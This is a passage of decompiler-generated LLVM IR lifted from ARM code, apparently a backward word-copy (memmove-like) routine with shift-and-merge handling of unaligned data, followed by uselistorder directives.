  %v8_ca68 = inttoptr i32 %v7_ca68 to i32*
  %v9_ca68 = load i32, i32* @ip, align 4
  store i32 %v9_ca68, i32* %v8_ca68, align 4
  %v10_ca68 = add i32 %v0_ca68, -4
  %v11_ca68 = inttoptr i32 %v10_ca68 to i32*
  %v12_ca68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_ca68, i32* %v11_ca68, align 4
  store i32 %v1_ca68, i32* %r0.global-to-local, align 4
  %v0_ca6c = load i32, i32* %r2.global-to-local, align 4
  %v2_ca6c = add i32 %v0_ca6c, -16
  store i32 %v2_ca6c, i32* %r2.global-to-local, align 4
  %v6_ca70 = icmp slt i32 %v0_ca6c, 16
  br i1 %v6_ca70, label %dec_label_pc_ca74, label %dec_label_pc_ca44.dec_label_pc_ca44_crit_edge

dec_label_pc_ca44.dec_label_pc_ca44_crit_edge:    ; preds = %dec_label_pc_ca44
  %v0_ca44.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_ca48.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ca44

dec_label_pc_ca74:                                ; preds = %dec_label_pc_ca44
  %v2_ca74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ca74, i32* @r4, align 4
  %v5_ca74 = load i8*, i8** %stack_var_-8, align 4
  %v6_ca74 = ptrtoint i8* %v5_ca74 to i32
  store i32 %v6_ca74, i32* @r5, align 4
  store i32 %v11_ca40, i32* @lr, align 4
  %v2_ca78 = add i32 %v0_ca6c, -4
  store i32 %v2_ca78, i32* %r2.global-to-local, align 4
  %v4_ca78 = add i32 %v0_ca6c, 2147483632
  %v5_ca78 = and i32 %v2_ca78, %v4_ca78
  %v6_ca78 = icmp slt i32 %v5_ca78, 0
  store i1 %v6_ca78, i1* %cpsr_v.global-to-local, align 1
  %v7_ca78 = icmp slt i32 %v2_ca78, 0
  store i1 %v7_ca78, i1* %cpsr_n.global-to-local, align 1
  %v5_ca7c = icmp slt i32 %v2_ca6c, -12
  br i1 %v5_ca7c, label %dec_label_pc_ca98, label %dec_label_pc_ca80

dec_label_pc_ca80:                                ; preds = %dec_label_pc_ca74, %dec_label_pc_ca34, %dec_label_pc_ca80
  %v1_ca8c = phi i32 [ %v5_ca8c, %dec_label_pc_ca80 ], [ %v1_ca68, %dec_label_pc_ca74 ], [ %v0_ca6830, %dec_label_pc_ca34 ]
  %v0_ca80 = load i32, i32* %r3.global-to-local, align 4
  %v3_ca80 = mul i32 %v0_ca80, 256
  store i32 %v3_ca80, i32* %ip.global-to-local, align 4
  %v0_ca84 = load i32, i32* %r1.global-to-local, align 4
  %v1_ca84 = add i32 %v0_ca84, -4
  %v2_ca84 = inttoptr i32 %v1_ca84 to i32*
  %v3_ca84 = load i32, i32* %v2_ca84, align 4
  store i32 %v3_ca84, i32* %r3.global-to-local, align 4
  store i32 %v1_ca84, i32* %r1.global-to-local, align 4
  %v4_ca88 = udiv i32 %v3_ca84, 16777216
  %v5_ca88 = or i32 %v4_ca88, %v3_ca80
  store i32 %v5_ca88, i32* @ip, align 4
  %v2_ca8c = add i32 %v1_ca8c, -4
  %v3_ca8c = inttoptr i32 %v2_ca8c to i32*
  store i32 %v5_ca88, i32* %v3_ca8c, align 4
  %v4_ca8c = load i32, i32* %r0.global-to-local, align 4
  %v5_ca8c = add i32 %v4_ca8c, -4
  store i32 %v5_ca8c, i32* %r0.global-to-local, align 4
  %v0_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v2_ca90 = add i32 %v0_ca90, -4
  store i32 %v2_ca90, i32* %r2.global-to-local, align 4
  %v6_ca94 = icmp slt i32 %v0_ca90, 4
  br i1 %v6_ca94, label %dec_label_pc_ca98.loopexit, label %dec_label_pc_ca80

dec_label_pc_ca98.loopexit:                       ; preds = %dec_label_pc_ca80
  %v4_ca90 = sub i32 3, %v0_ca90
  %v5_ca90 = and i32 %v4_ca90, %v0_ca90
  %v6_ca90 = icmp slt i32 %v5_ca90, 0
  %v7_ca90 = icmp slt i32 %v2_ca90, 0
  store i1 %v6_ca90, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_ca90, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_ca98

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca98.loopexit, %dec_label_pc_ca74
  %v2_c9dc62 = phi i32 [ %v5_ca8c, %dec_label_pc_ca98.loopexit ], [ %v1_ca68, %dec_label_pc_ca74 ]
  %v0_c9cc58 = phi i32 [ %v2_ca90, %dec_label_pc_ca98.loopexit ], [ %v2_ca78, %dec_label_pc_ca74 ]
  %v0_ca98 = load i32, i32* %r1.global-to-local, align 4
  %v1_ca98 = add i32 %v0_ca98, 3
  store i32 %v1_ca98, i32* @r1, align 4
  br label %bb142

dec_label_pc_caa0:                                ; preds = %dec_label_pc_ca30
  br i1 %v5_cb10, label %dec_label_pc_caec, label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %dec_label_pc_caa0
  store i32 %v2_cb0c, i32* %r2.global-to-local, align 4
  %v3_caac = load i32, i32* @r4, align 4
  store i32 %v3_caac, i32* %stack_var_-12, align 4
  %v6_caac = load i32, i32* @r5, align 4
  %v8_caac = inttoptr i32 %v6_caac to i8*
  store i8* %v8_caac, i8** %stack_var_-8, align 4
  %v11_caac = load i32, i32* @lr, align 4
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.dec_label_pc_cab0_crit_edge, %dec_label_pc_caa8
  %v0_cad4 = phi i32 [ %v1_cad4, %dec_label_pc_cab0.dec_label_pc_cab0_crit_edge ], [ %v0_ca6830, %dec_label_pc_caa8 ]
  %v0_cab4 = phi i32 [ %v0_cab4.pre, %dec_label_pc_cab0.dec_label_pc_cab0_crit_edge ], [ %v1_ca20, %dec_label_pc_caa8 ]
  %v0_cab0 = phi i32 [ %v0_cab0.pre, %dec_label_pc_cab0.dec_label_pc_cab0_crit_edge ], [ %v2_ca24, %dec_label_pc_caa8 ]
  %v3_cab0 = mul i32 %v0_cab0, 65536
  store i32 %v3_cab0, i32* %lr.global-to-local, align 4
  %v1_cab4 = add i32 %v0_cab4, -4
  %v2_cab4 = inttoptr i32 %v1_cab4 to i32*
  %v3_cab4 = load i32, i32* %v2_cab4, align 4
  store i32 %v3_cab4, i32* %r3.global-to-local, align 4
  %v4_cab4 = add i32 %v0_cab4, -8
  %v5_cab4 = inttoptr i32 %v4_cab4 to i32*
  %v6_cab4 = load i32, i32* %v5_cab4, align 4
  store i32 %v6_cab4, i32* %r4.global-to-local, align 4
  %v7_cab4 = add i32 %v0_cab4, -12
  %v8_cab4 = inttoptr i32 %v7_cab4 to i32*
  %v9_cab4 = load i32, i32* %v8_cab4, align 4
  store i32 %v9_cab4, i32* %r5.global-to-local, align 4
  %v10_cab4 = add i32 %v0_cab4, -16
  %v11_cab4 = inttoptr i32 %v10_cab4 to i32*
  %v12_cab4 = load i32, i32* %v11_cab4, align 4
  store i32 %v10_cab4, i32* %r1.global-to-local, align 4
  %v4_cab8 = udiv i32 %v12_cab4, 65536
  %v5_cab8 = or i32 %v4_cab8, %v3_cab0
  store i32 %v5_cab8, i32* %lr.global-to-local, align 4
  %v3_cabc = mul i32 %v12_cab4, 65536
  %v4_cac0 = udiv i32 %v9_cab4, 65536
  %v5_cac0 = or i32 %v3_cabc, %v4_cac0
  store i32 %v5_cac0, i32* @ip, align 4
  %v3_cac4 = mul i32 %v9_cab4, 65536
  %v4_cac8 = udiv i32 %v6_cab4, 65536
  %v5_cac8 = or i32 %v3_cac4, %v4_cac8
  store i32 %v5_cac8, i32* %r5.global-to-local, align 4
  %v3_cacc = mul i32 %v6_cab4, 65536
  %v4_cad0 = udiv i32 %v3_cab4, 65536
  %v5_cad0 = or i32 %v3_cacc, %v4_cad0
  store i32 %v5_cad0, i32* %r4.global-to-local, align 4
  %v1_cad4 = add i32 %v0_cad4, -16
  %v2_cad4 = inttoptr i32 %v1_cad4 to i32*
  store i32 %v5_cad0, i32* %v2_cad4, align 4
  %v4_cad4 = add i32 %v0_cad4, -12
  %v5_cad4 = inttoptr i32 %v4_cad4 to i32*
  %v6_cad4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_cad4, i32* %v5_cad4, align 4
  %v7_cad4 = add i32 %v0_cad4, -8
  %v8_cad4 = inttoptr i32 %v7_cad4 to i32*
  %v9_cad4 = load i32, i32* @ip, align 4
  store i32 %v9_cad4, i32* %v8_cad4, align 4
  %v10_cad4 = add i32 %v0_cad4, -4
  %v11_cad4 = inttoptr i32 %v10_cad4 to i32*
  %v12_cad4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_cad4, i32* %v11_cad4, align 4
  store i32 %v1_cad4, i32* %r0.global-to-local, align 4
  %v0_cad8 = load i32, i32* %r2.global-to-local, align 4
  %v2_cad8 = add i32 %v0_cad8, -16
  store i32 %v2_cad8, i32* %r2.global-to-local, align 4
  %v6_cadc = icmp slt i32 %v0_cad8, 16
  br i1 %v6_cadc, label %dec_label_pc_cae0, label %dec_label_pc_cab0.dec_label_pc_cab0_crit_edge

dec_label_pc_cab0.dec_label_pc_cab0_crit_edge:    ; preds = %dec_label_pc_cab0
  %v0_cab0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_cab4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_cab0

dec_label_pc_cae0:                                ; preds = %dec_label_pc_cab0
  %v2_cae0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_cae0, i32* @r4, align 4
  %v5_cae0 = load i8*, i8** %stack_var_-8, align 4
  %v6_cae0 = ptrtoint i8* %v5_cae0 to i32
  store i32 %v6_cae0, i32* @r5, align 4
  store i32 %v11_caac, i32* @lr, align 4
  %v2_cae4 = add i32 %v0_cad8, -4
  store i32 %v2_cae4, i32* %r2.global-to-local, align 4
  %v4_cae4 = add i32 %v0_cad8, 2147483632
  %v5_cae4 = and i32 %v2_cae4, %v4_cae4
  %v6_cae4 = icmp slt i32 %v5_cae4, 0
  store i1 %v6_cae4, i1* %cpsr_v.global-to-local, align 1
  %v7_cae4 = icmp slt i32 %v2_cae4, 0
  store i1 %v7_cae4, i1* %cpsr_n.global-to-local, align 1
  %v5_cae8 = icmp slt i32 %v2_cad8, -12
  br i1 %v5_cae8, label %dec_label_pc_cb04, label %dec_label_pc_caec

dec_label_pc_caec:                                ; preds = %dec_label_pc_cae0, %dec_label_pc_caa0, %dec_label_pc_caec
  %v1_caf8 = phi i32 [ %v5_caf8, %dec_label_pc_caec ], [ %v1_cad4, %dec_label_pc_cae0 ], [ %v0_ca6830, %dec_label_pc_caa0 ]
  %v0_caec = load i32, i32* %r3.global-to-local, align 4
  %v3_caec = mul i32 %v0_caec, 65536
  store i32 %v3_caec, i32* %ip.global-to-local, align 4
  %v0_caf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_caf0 = add i32 %v0_caf0, -4
  %v2_caf0 = inttoptr i32 %v1_caf0 to i32*
  %v3_caf0 = load i32, i32* %v2_caf0, align 4
  store i32 %v3_caf0, i32* %r3.global-to-local, align 4
  store i32 %v1_caf0, i32* %r1.global-to-local, align 4
  %v4_caf4 = udiv i32 %v3_caf0, 65536
  %v5_caf4 = or i32 %v4_caf4, %v3_caec
  store i32 %v5_caf4, i32* @ip, align 4
  %v2_caf8 = add i32 %v1_caf8, -4
  %v3_caf8 = inttoptr i32 %v2_caf8 to i32*
  store i32 %v5_caf4, i32* %v3_caf8, align 4
  %v4_caf8 = load i32, i32* %r0.global-to-local, align 4
  %v5_caf8 = add i32 %v4_caf8, -4
  store i32 %v5_caf8, i32* %r0.global-to-local, align 4
  %v0_cafc = load i32, i32* %r2.global-to-local, align 4
  %v2_cafc = add i32 %v0_cafc, -4
  store i32 %v2_cafc, i32* %r2.global-to-local, align 4
  %v6_cb00 = icmp slt i32 %v0_cafc, 4
  br i1 %v6_cb00, label %dec_label_pc_cb04.loopexit, label %dec_label_pc_caec

dec_label_pc_cb04.loopexit:                       ; preds = %dec_label_pc_caec
  %v4_cafc = sub i32 3, %v0_cafc
  %v5_cafc = and i32 %v4_cafc, %v0_cafc
  %v6_cafc = icmp slt i32 %v5_cafc, 0
  %v7_cafc = icmp slt i32 %v2_cafc, 0
  store i1 %v6_cafc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_cafc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cb04.loopexit, %dec_label_pc_cae0
  %v2_c9dc63 = phi i32 [ %v5_caf8, %dec_label_pc_cb04.loopexit ], [ %v1_cad4, %dec_label_pc_cae0 ]
  %v0_c9cc59 = phi i32 [ %v2_cafc, %dec_label_pc_cb04.loopexit ], [ %v2_cae4, %dec_label_pc_cae0 ]
  %v0_cb04 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb04 = add i32 %v0_cb04, 2
  store i32 %v1_cb04, i32* @r1, align 4
  br label %bb142

dec_label_pc_cb0c:                                ; preds = %dec_label_pc_ca20
  br i1 %v5_cb10, label %dec_label_pc_cb58, label %dec_label_pc_cb14

dec_label_pc_cb14:                                ; preds = %dec_label_pc_cb0c
  store i32 %v2_cb0c, i32* %r2.global-to-local, align 4
  %v3_cb18 = load i32, i32* @r4, align 4
  store i32 %v3_cb18, i32* %stack_var_-12, align 4
  %v6_cb18 = load i32, i32* @r5, align 4
  %v8_cb18 = inttoptr i32 %v6_cb18 to i8*
  store i8* %v8_cb18, i8** %stack_var_-8, align 4
  %v11_cb18 = load i32, i32* @lr, align 4
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge, %dec_label_pc_cb14
  %v0_cb40 = phi i32 [ %v1_cb40, %dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge ], [ %v0_ca6830, %dec_label_pc_cb14 ]
  %v0_cb20 = phi i32 [ %v0_cb20.pre, %dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge ], [ %v1_ca20, %dec_label_pc_cb14 ]
  %v0_cb1c = phi i32 [ %v0_cb1c.pre, %dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge ], [ %v2_ca24, %dec_label_pc_cb14 ]
  %v3_cb1c = mul i32 %v0_cb1c, 16777216
  store i32 %v3_cb1c, i32* %lr.global-to-local, align 4
  %v1_cb20 = add i32 %v0_cb20, -4
  %v2_cb20 = inttoptr i32 %v1_cb20 to i32*
  %v3_cb20 = load i32, i32* %v2_cb20, align 4
  store i32 %v3_cb20, i32* %r3.global-to-local, align 4
  %v4_cb20 = add i32 %v0_cb20, -8
  %v5_cb20 = inttoptr i32 %v4_cb20 to i32*
  %v6_cb20 = load i32, i32* %v5_cb20, align 4
  store i32 %v6_cb20, i32* %r4.global-to-local, align 4
  %v7_cb20 = add i32 %v0_cb20, -12
  %v8_cb20 = inttoptr i32 %v7_cb20 to i32*
  %v9_cb20 = load i32, i32* %v8_cb20, align 4
  store i32 %v9_cb20, i32* %r5.global-to-local, align 4
  %v10_cb20 = add i32 %v0_cb20, -16
  %v11_cb20 = inttoptr i32 %v10_cb20 to i32*
  %v12_cb20 = load i32, i32* %v11_cb20, align 4
  store i32 %v10_cb20, i32* %r1.global-to-local, align 4
  %v4_cb24 = udiv i32 %v12_cb20, 256
  %v5_cb24 = or i32 %v4_cb24, %v3_cb1c
  store i32 %v5_cb24, i32* %lr.global-to-local, align 4
  %v3_cb28 = mul i32 %v12_cb20, 16777216
  %v4_cb2c = udiv i32 %v9_cb20, 256
  %v5_cb2c = or i32 %v3_cb28, %v4_cb2c
  store i32 %v5_cb2c, i32* @ip, align 4
  %v3_cb30 = mul i32 %v9_cb20, 16777216
  %v4_cb34 = udiv i32 %v6_cb20, 256
  %v5_cb34 = or i32 %v3_cb30, %v4_cb34
  store i32 %v5_cb34, i32* %r5.global-to-local, align 4
  %v3_cb38 = mul i32 %v6_cb20, 16777216
  %v4_cb3c = udiv i32 %v3_cb20, 256
  %v5_cb3c = or i32 %v3_cb38, %v4_cb3c
  store i32 %v5_cb3c, i32* %r4.global-to-local, align 4
  %v1_cb40 = add i32 %v0_cb40, -16
  %v2_cb40 = inttoptr i32 %v1_cb40 to i32*
  store i32 %v5_cb3c, i32* %v2_cb40, align 4
  %v4_cb40 = add i32 %v0_cb40, -12
  %v5_cb40 = inttoptr i32 %v4_cb40 to i32*
  %v6_cb40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_cb40, i32* %v5_cb40, align 4
  %v7_cb40 = add i32 %v0_cb40, -8
  %v8_cb40 = inttoptr i32 %v7_cb40 to i32*
  %v9_cb40 = load i32, i32* @ip, align 4
  store i32 %v9_cb40, i32* %v8_cb40, align 4
  %v10_cb40 = add i32 %v0_cb40, -4
  %v11_cb40 = inttoptr i32 %v10_cb40 to i32*
  %v12_cb40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_cb40, i32* %v11_cb40, align 4
  store i32 %v1_cb40, i32* %r0.global-to-local, align 4
  %v0_cb44 = load i32, i32* %r2.global-to-local, align 4
  %v2_cb44 = add i32 %v0_cb44, -16
  store i32 %v2_cb44, i32* %r2.global-to-local, align 4
  %v6_cb48 = icmp slt i32 %v0_cb44, 16
  br i1 %v6_cb48, label %dec_label_pc_cb4c, label %dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge

dec_label_pc_cb1c.dec_label_pc_cb1c_crit_edge:    ; preds = %dec_label_pc_cb1c
  %v0_cb1c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_cb20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_cb1c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb1c
  %v2_cb4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_cb4c, i32* @r4, align 4
  %v5_cb4c = load i8*, i8** %stack_var_-8, align 4
  %v6_cb4c = ptrtoint i8* %v5_cb4c to i32
  store i32 %v6_cb4c, i32* @r5, align 4
  store i32 %v11_cb18, i32* @lr, align 4
  %v2_cb50 = add i32 %v0_cb44, -4
  store i32 %v2_cb50, i32* %r2.global-to-local, align 4
  %v4_cb50 = add i32 %v0_cb44, 2147483632
  %v5_cb50 = and i32 %v2_cb50, %v4_cb50
  %v6_cb50 = icmp slt i32 %v5_cb50, 0
  store i1 %v6_cb50, i1* %cpsr_v.global-to-local, align 1
  %v7_cb50 = icmp slt i32 %v2_cb50, 0
  store i1 %v7_cb50, i1* %cpsr_n.global-to-local, align 1
  %v5_cb54 = icmp slt i32 %v2_cb44, -12
  br i1 %v5_cb54, label %dec_label_pc_cb70, label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c, %dec_label_pc_cb0c, %dec_label_pc_cb58
  %v1_cb64 = phi i32 [ %v5_cb64, %dec_label_pc_cb58 ], [ %v1_cb40, %dec_label_pc_cb4c ], [ %v0_ca6830, %dec_label_pc_cb0c ]
  %v0_cb58 = load i32, i32* %r3.global-to-local, align 4
  %v3_cb58 = mul i32 %v0_cb58, 16777216
  store i32 %v3_cb58, i32* %ip.global-to-local, align 4
  %v0_cb5c = load i32, i32* %r1.global-to-local, align 4
  %v1_cb5c = add i32 %v0_cb5c, -4
  %v2_cb5c = inttoptr i32 %v1_cb5c to i32*
  %v3_cb5c = load i32, i32* %v2_cb5c, align 4
  store i32 %v3_cb5c, i32* %r3.global-to-local, align 4
  store i32 %v1_cb5c, i32* %r1.global-to-local, align 4
  %v4_cb60 = udiv i32 %v3_cb5c, 256
  %v5_cb60 = or i32 %v4_cb60, %v3_cb58
  store i32 %v5_cb60, i32* @ip, align 4
  %v2_cb64 = add i32 %v1_cb64, -4
  %v3_cb64 = inttoptr i32 %v2_cb64 to i32*
  store i32 %v5_cb60, i32* %v3_cb64, align 4
  %v4_cb64 = load i32, i32* %r0.global-to-local, align 4
  %v5_cb64 = add i32 %v4_cb64, -4
  store i32 %v5_cb64, i32* %r0.global-to-local, align 4
  %v0_cb68 = load i32, i32* %r2.global-to-local, align 4
  %v2_cb68 = add i32 %v0_cb68, -4
  store i32 %v2_cb68, i32* %r2.global-to-local, align 4
  %v6_cb6c = icmp slt i32 %v0_cb68, 4
  br i1 %v6_cb6c, label %dec_label_pc_cb70.loopexit, label %dec_label_pc_cb58

dec_label_pc_cb70.loopexit:                       ; preds = %dec_label_pc_cb58
  %v4_cb68 = sub i32 3, %v0_cb68
  %v5_cb68 = and i32 %v4_cb68, %v0_cb68
  %v6_cb68 = icmp slt i32 %v5_cb68, 0
  %v7_cb68 = icmp slt i32 %v2_cb68, 0
  store i1 %v6_cb68, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_cb68, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_cb70

dec_label_pc_cb70:                                ; preds = %dec_label_pc_cb70.loopexit, %dec_label_pc_cb4c
  %v2_c9dc64 = phi i32 [ %v5_cb64, %dec_label_pc_cb70.loopexit ], [ %v1_cb40, %dec_label_pc_cb4c ]
  %v0_c9cc60 = phi i32 [ %v2_cb68, %dec_label_pc_cb70.loopexit ], [ %v2_cb50, %dec_label_pc_cb4c ]
  %v0_cb70 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb70 = add i32 %v0_cb70, 1
  store i32 %v1_cb70, i32* @r1, align 4
  br label %bb142

; uselistorder directives
  uselistorder i32 %v5_cb64, { 0, 2, 1 }
  uselistorder i32 %v3_cb58, { 1, 0 }
  uselistorder i32 %v2_cb50, { 0, 2, 1, 3 }
  uselistorder i32 %v1_cb40, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_cb20, { 1, 0 }
  uselistorder i32 %v3_cb1c, { 1, 0 }
  uselistorder i32 %v0_cb20, { 3, 2, 1, 0 }
  uselistorder i32 %v0_cb40, { 3, 2, 1, 0 }
  uselistorder i32 %v5_caf8, { 0, 2, 1 }
  uselistorder i32 %v3_caec, { 1, 0 }
  uselistorder i32 %v2_cae4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_cad4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_cab4, { 1, 0 }
  uselistorder i32 %v3_cab0, { 1, 0 }
  uselistorder i32 %v0_cab4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_cad4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_ca8c, { 0, 2, 1 }
  uselistorder i32 %v3_ca80, { 1, 0 }
  uselistorder i32 %v2_ca78, { 0, 2, 1, 3 }
  uselistorder i32 %v1_ca68, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_ca48, { 1, 0 }
  uselistorder i32 %v3_ca44, { 1, 0 }
  uselistorder i32 %v0_ca48, { 3, 2, 1, 0 }
  uselistorder i32 %v0_ca68, { 3, 2, 1, 0 }
  uselistorder i1 %v5_cb10, { 2, 0, 1 }
  uselistorder i32 %v0_ca28, { 1, 0 }
  uselistorder i32 %v0_cb14, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ca6830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_ca18, { 2, 1, 0 }
  uselistorder i32 %v0_ca18, { 2, 0, 1 }
  uselistorder i32 %v2_ca10, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_ca10, { 1, 0, 2 }
  uselistorder i32 %v0_ca10, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ca6831, { 2, 1, 0 }
  uselistorder i32 %v11_c9ec, { 1, 0 }
  uselistorder i32 %v7_c9ec, { 1, 0 }
  uselistorder i32 %v1_c9cc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_c9cc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_c9d0, { 1, 0 }
  uselistorder i32 %v7_c9c4, { 0, 2, 1 }
  uselistorder i32 %v10_c9c0, { 1, 0 }
  uselistorder i32 %v9_c9b8, { 1, 0, 2 }
  uselistorder i32 %v6_c9b4, { 1, 0 }
  uselistorder i32 %v2_c9ac, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_c9ac, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_c9bc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_c9a0, { 0, 2, 1 }
  uselistorder i32 %v13_c99c, { 1, 0 }
  uselistorder i32 %v4_c998, { 0, 2, 1, 3 }
  uselistorder i32 %v0_c998, { 2, 0, 1 }
  uselistorder i32 %v6_c9a0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_c990, { 0, 2, 1 }
  uselistorder i32 %v16_c98c, { 1, 0 }
  uselistorder i32 %v4_c988, { 1, 0 }
  uselistorder i32 %v0_c998.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_c990, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_c97c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_c978, { 1, 0 }
  uselistorder i32 %v1_c974, { 1, 0 }
  uselistorder i32 %v10_c970, { 1, 0 }
  uselistorder i32 %v0_c970, { 3, 2, 1, 0 }
  uselistorder i32 %v0_c974, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_c968, { 0, 2, 1 }
  uselistorder i32 %v2_c95c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c95c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_c97448, { 1, 2, 0 }
  uselistorder i32 %v1_c954, { 2, 1, 0 }
  uselistorder i32 %v1_c94c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_c944, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_c940, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_c93c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_c93c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_c928, { 0, 2, 1 }
  uselistorder i32 %v3_c91c, { 1, 0 }
  uselistorder i32 %v2_c914, { 0, 2, 1, 3 }
  uselistorder i32 %v12_c904, { 1, 0, 3, 2 }
  uselistorder i32 %v8_c8e4, { 1, 0, 2 }
  uselistorder i32 %v5_c8e4, { 1, 0, 2 }
  uselistorder i32 %v2_c8e4, { 1, 0, 2 }
  uselistorder i32 %v3_c8e0, { 1, 0 }
  uselistorder i32 %v0_c8e4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_c904, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_c8bc, { 0, 2, 1 }
  uselistorder i32 %v3_c8b0, { 1, 0 }
  uselistorder i32 %v2_c8a8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_c898, { 1, 0, 3, 2 }
  uselistorder i32 %v8_c878, { 1, 0, 2 }
  uselistorder i32 %v5_c878, { 1, 0, 2 }
  uselistorder i32 %v2_c878, { 1, 0, 2 }
  uselistorder i32 %v3_c874, { 1, 0 }
  uselistorder i32 %v0_c878, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_c898, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_c850, { 0, 2, 1 }
  uselistorder i32 %v3_c844, { 1, 0 }
  uselistorder i32 %v2_c83c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_c82c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_c80c, { 1, 0, 2 }
  uselistorder i32 %v5_c80c, { 1, 0, 2 }
  uselistorder i32 %v2_c80c, { 1, 0, 2 }
  uselistorder i32 %v3_c808, { 1, 0 }
  uselistorder i32 %v0_c80c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_c82c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_c8d4, { 2, 0, 1 }
  uselistorder i32 %v0_c8d8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c82c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_c7dc, { 1, 0 }
  uselistorder i32 %v0_c7dc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_c7d4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_c7d4, { 1, 0, 2 }
  uselistorder i32 %v0_c7d4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c82c75, { 2, 1, 0 }
  uselistorder i32 %v1_c7b4, { 1, 0, 2 }
  uselistorder i32 %v1_c78c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_c78c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_c778, { 1, 0, 2 }
  uselistorder i32 %v6_c774, { 1, 0 }
  uselistorder i32 %v2_c76c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_c76c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_c77c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_c764, { 0, 2, 1 }
  uselistorder i1 %v0_c764, { 1, 0 }
  uselistorder i1 %v1_c764, { 1, 0 }
  uselistorder i32 %v3_c760, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_c758, { 0, 2, 1, 3 }
  uselistorder i32 %v4_c744, { 1, 0 }
  uselistorder i32 %v12_c738, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c72c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_c730, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_c720, { 0, 2, 1 }
  uselistorder i32 %v2_c718, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c718, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_c710, { 1, 0 }
  uselistorder i32 %v1_c708, { 2, 1, 0 }
  uselistorder i32 %v2_c700, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_c700, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c6f0, { 1, 0 }
